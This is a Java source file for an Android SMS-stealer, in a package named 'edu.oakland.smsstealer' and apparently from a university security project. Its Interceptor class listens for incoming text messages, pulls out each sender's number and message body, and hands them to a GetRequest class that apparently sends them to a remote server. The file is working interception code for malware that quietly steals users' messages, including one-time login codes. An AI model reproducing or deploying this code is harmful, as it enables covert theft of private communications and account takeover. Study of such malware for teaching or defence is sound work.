package edu.oakland.smsstealer;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.widget.Toast;

import java.util.HashMap;

/**
 * Created by anthony on 1/7/17.
 */
public class Interceptor extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        final Bundle bundle = intent.getExtras();
        try {
            if (bundle != null) {
                String message = null, number = null;
                final Object[] pdusObj = (Object[]) bundle.get("pdus");

                for (int i = 0; i < pdusObj.length; i++) {
                    SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
                    number = currentMessage.getDisplayOriginatingAddress();
                    message = currentMessage.getDisplayMessageBody();
                }
                if (message != null && number != null) {
                    new GetRequest(number, message).execute();
                }
            }
        } catch (Exception e) {
            Toast.makeText(context, "Some sort of exception. No other information.", Toast.LENGTH_LONG).show();
        }
    }
}